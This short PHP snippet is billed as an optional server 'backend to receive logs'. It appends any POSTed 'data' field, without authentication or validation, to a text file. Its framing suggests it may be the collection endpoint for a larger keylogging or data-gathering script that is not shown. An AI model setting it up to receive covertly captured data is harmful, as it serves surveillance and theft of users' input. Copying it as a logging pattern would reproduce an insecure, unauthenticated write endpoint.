//Optional: Upload PHP server (backend) to receive logs
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = $_POST['data'];
    file_put_contents("logs.txt", $data, FILE_APPEND);
    echo "OK";
}
?>
